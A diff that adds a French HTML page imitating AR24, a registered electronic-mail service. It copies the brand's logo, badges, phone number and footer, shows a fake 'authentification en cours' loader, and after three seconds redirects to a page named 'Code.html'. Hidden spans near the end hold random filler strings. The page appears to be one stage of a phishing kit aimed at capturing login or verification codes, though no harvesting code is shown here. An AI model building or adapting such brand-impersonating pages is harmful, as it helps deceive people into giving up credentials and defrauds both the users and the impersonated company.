@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="fr" class="js">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <title>Chargement - AR24</title>
+  <meta name="theme-color" content="#000080">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f8f9fc;
+      color: #000080;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Barre de navigation supérieure */
+    header {
+      background-color: #ffffff;
+      padding: 16px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #eef0f6;
+      box-shadow: 0 1px 10px rgba(0, 0, 0, 0.04);
+    }
+
+    /* Logo MON SIT couleur #000080 */
+    .logo {
+      font-size: 30px;
+      font-weight: 800;
+      color: #000080;
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
+
+    .nav-actions {
+      display: flex;
+      gap: 12px;
+    }
+
+    .btn-pill-primary {
+      background-color: #0000cc;
+      color: #ffffff;
+      border: 1px solid #0000cc;
+      padding: 8px 22px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-pill-primary:hover {
+      background-color: #000080;
+      border-color: #000080;
+    }
+
+    .btn-pill-outline {
+      background-color: #ffffff;
+      color: #000080;
+      border: 1px solid #000080;
+      padding: 8px 22px;
+      border-radius: 50px;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-pill-outline:hover {
+      background-color: #f0f4ff;
+    }
+
+    /* Zone principale centrée */
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 55px 20px 80px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #000080;
+      font-size: 32px;
+      font-weight: 600;
+      margin-bottom: 24px;
+    }
+
+    .subtitle {
+      color: #000080;
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 32px;
+    }
+
+    /* Carte centrale de chargement */
+    .loading-card {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 460px;
+      padding: 36px 32px;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 46, 0.05);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .auth-status {
+      color: #000080;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 24px;
+    }
+
+    /* Grille de chargement animée (8 carrés autour d'un centre vide) */
+    .loader-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 18px);
+      grid-template-rows: repeat(3, 18px);
+      gap: 3px;
+      margin-bottom: 32px;
+    }
+
+    .loader-cell {
+      width: 18px;
+      height: 18px;
+      background-color: #607d94;
+      border-radius: 1px;
+      animation: pulse-square 1.2s infinite ease-in-out;
+    }
+
+    .loader-empty {
+      width: 18px;
+      height: 18px;
+      background: transparent;
+    }
+
+    .cell-1 { animation-delay: 0.00s; }
+    .cell-2 { animation-delay: 0.15s; }
+    .cell-3 { animation-delay: 0.30s; }
+    .cell-4 { animation-delay: 0.45s; }
+    .cell-5 { animation-delay: 0.60s; }
+    .cell-6 { animation-delay: 0.75s; }
+    .cell-7 { animation-delay: 0.90s; }
+    .cell-8 { animation-delay: 1.05s; }
+
+    @keyframes pulse-square {
+      0%, 100% {
+        background-color: #607d94;
+        transform: scale(1);
+      }
+      15% {
+        background-color: #000080;
+        transform: scale(1.06);
+      }
+      35% {
+        background-color: #2563eb;
+      }
+    }
+
+    .btn-badge-pill {
+      display: inline-block;
+      background-color: #ffffff;
+      color: #000080;
+      border: 1px solid #000080;
+      padding: 12px 30px;
+      border-radius: 50px;
+      font-size: 12.5px;
+      font-weight: 700;
+      text-decoration: none;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    .btn-badge-pill:hover {
+      background-color: #f0f4ff;
+    }
+
+    /* ================= FOOTER IDENTIQUE AU MODÈLE ================= */
+    footer {
+      background-color: #ffffff;
+      border-top: 1px solid #eef0f6;
+      padding: 30px 40px 40px;
+      color: #334155;
+      font-size: 13px;
+    }
+
+    .footer-container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    /* Partie supérieure du footer */
+    .footer-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+
+    .footer-brand {
+      display: flex;
+      align-items: baseline;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .footer-logo {
+      font-size: 28px;
+      font-weight: 800;
+      color: #000080;
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
+
+    .footer-tagline {
+      color: #475569;
+      font-size: 12.5px;
+      line-height: 1.4;
+      max-width: 500px;
+    }
+
+    .footer-badges {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+      font-weight: 600;
+      color: #000080;
+      font-size: 14px;
+    }
+
+    /* Partie inférieure du footer (Grille 5 colonnes alignée comme le modèle) */
+    .footer-bottom {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr 1fr 1.3fr 1fr;
+      gap: 24px;
+      padding-top: 24px;
+      align-items: start;
+    }
+
+    .footer-contact .phone-number {
+      color: #000080;
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 2px;
+    }
+
+    .footer-contact .price-info {
+      color: #000080;
+      font-size: 11.5px;
+      margin-bottom: 12px;
+    }
+
+    .footer-contact .hours-info {
+      color: #64748b;
+      font-size: 11.5px;
+      line-height: 1.4;
+    }
+
+    .footer-col {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .footer-col a {
+      color: #334155;
+      text-decoration: none;
+      font-size: 12.5px;
+      transition: color 0.15s;
+    }
+
+    .footer-col a:hover {
+      color: #000080;
+      text-decoration: underline;
+    }
+
+    .footer-meta {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      gap: 16px;
+    }
+
+    .lang-flags {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .flag-btn {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      overflow: hidden;
+      border: 1px solid #cbd5e1;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      padding: 0;
+      background: none;
+      font-size: 11px;
+    }
+
+    .copyright {
+      color: #64748b;
+      font-size: 11.5px;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 960px) {
+      .footer-bottom {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+
+    @media (max-width: 560px) {
+      .footer-bottom {
+        grid-template-columns: 1fr;
+      }
+      header, footer {
+        padding-left: 20px;
+        padding-right: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- En-tête -->
+  <header>
+    <a href="#" class="logo">AR24</a>
+    <div class="nav-actions">
+      <a href="#" class="btn-pill-primary">Inscription</a>
+      <a href="#" class="btn-pill-outline">Se connecter</a>
+    </div>
+  </header>
+
+  <!-- Zone centrale de chargement -->
+  <main>
+    <h1>Chargement</h1>
+    <p class="subtitle">Veuillez patienter quelques instants !</p>
+
+    <div class="loading-card">
+      <p class="auth-status">authentification en cours...</p>
+
+      <!-- Grille 3x3 avec centre vide animée -->
+      <div class="loader-grid" aria-label="Chargement en cours">
+        <div class="loader-cell cell-1"></div>
+        <div class="loader-cell cell-2"></div>
+        <div class="loader-cell cell-3"></div>
+        <div class="loader-cell cell-8"></div>
+        <div class="loader-empty"></div>
+        <div class="loader-cell cell-4"></div>
+        <div class="loader-cell cell-7"></div>
+        <div class="loader-cell cell-6"></div>
+        <div class="loader-cell cell-5"></div>
+      </div>
+
+      <span class="btn-badge-pill">Votre solution électroniques fiable</span>
+    </div>
+  </main>
+
+ <footer>
+    <div class="footer-container">
+      <div class="footer-top">
+        <div class="footer-brand">
+          <a href="#" class="footer-logo">AR24</a>
+          <p class="footer-tagline">
+            Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace,<br>
+            AR24 est un service certifié et sécurisé.
+          </p>
+        </div>
+
+        <div class="footer-badges">
+          <div class="badge-item">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="#64748b" style="margin-bottom:3px;">
+              <path d="M14 4c-1.5 0-2.5 1-3 2-1.5 0-3 1.5-3 3.5 0 1 .4 1.9 1 2.5L7 16h3l1 4h2l1-4h3l-1.5-3.5c.9-.7 1.5-1.8 1.5-3 0-2.5-1.5-5.5-3-5.5z"/>
+            </svg>
+            <span>La<br>FRENCH TECH</span>
+          </div>
+          <div class="badge-item">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="#64748b" style="margin-bottom:3px;">
+              <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
+            </svg>
+            <span>Région<br>Partenaire</span>
+          </div>
+          <div class="badge-item">
+            <span class="big-text">Syntec</span>
+            <span style="letter-spacing:1px; font-size:8.5px; margin-top:2px;">NUMÉRIQUE</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="footer-contact">
+          <div class="phone">08 11 69 05 45</div>
+          <div class="price">(0.05€/min + prix appel)</div>
+          <div class="hours">
+            Du lundi au vendredi<br>
+            de 8h00 à 17h30 en continu
+          </div>
+        </div>
+
+        <div class="footer-col">
+          <a href="#">Accueil</a>
+          <a href="#">Qui sommes-nous ?</a>
+          <a href="#">Avantages</a>
+          <a href="#">Certifications</a>
+          <a href="#">Contact</a>
+        </div>
+
+        <div class="footer-col">
+          <a href="#">Pour qui ?</a>
+          <a href="#">FAQ</a>
+          <a href="#">Base de connaissances</a>
+          <a href="#">Vérifier mes preuves</a>
+          <a href="#">Vérifier un email</a>
+          <a href="#">Etat du service</a>
+        </div>
+
+        <div class="footer-col">
+          <a href="#">CGU</a>
+          <a href="#">Mentions légales</a>
+          <a href="#">Politique de confidentialité : inscription</a>
+          <a href="#">Sous-traitants ultérieurs</a>
+          <a href="#">Paramètres des cookies</a>
+          <a href="#">Accessibilité : partiellement conforme</a>
+        </div>
+
+        <div class="footer-meta">
+          <div class="lang-flags">
+            <button type="button" class="flag-btn" title="Français" aria-label="Français">
+              <svg width="22" height="22" viewBox="0 0 3 2">
+                <rect width="1" height="2" x="0" fill="#002395"/>
+                <rect width="1" height="2" x="1" fill="#ffffff"/>
+                <rect width="1" height="2" x="2" fill="#ed2939"/>
+              </svg>
+            </button>
+            <button type="button" class="flag-btn" title="English" aria-label="English">
+              <svg width="22" height="22" viewBox="0 0 60 30">
+                <rect width="60" height="30" fill="#012169"/>
+                <path d="M0,0 L60,30 M60,0 L0,30" stroke="#fff" stroke-width="6"/>
+                <path d="M30,0 v30 M0,15 h60" stroke="#fff" stroke-width="10"/>
+                <path d="M30,0 v30 M0,15 h60" stroke="#C8102E" stroke-width="6"/>
+              </svg>
+            </button>
+            <button type="button" class="flag-btn" title="Nederlands" aria-label="Nederlands">
+              <svg width="22" height="22" viewBox="0 0 3 2">
+                <rect width="3" height="0.67" y="0" fill="#ae1c28"/>
+                <rect width="3" height="0.67" y="0.67" fill="#ffffff"/>
+                <rect width="3" height="0.67" y="1.33" fill="#21468b"/>
+              </svg>
+            </button>
+          </div>
+
+          <div class="copyright">
+            Tous droits réservés<br>
+            AR24 2026
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+   
+    	<span style="display:none">t.</span>   
+ 
+   	<span style="display:none">aV</span>
+
+   	<span style="display:none">2P</span>
+<script>
+setTimeout(() => {
+  window.location.href = "Code.html";
+}, 3000);
+</script>
+</body>
+</html>      
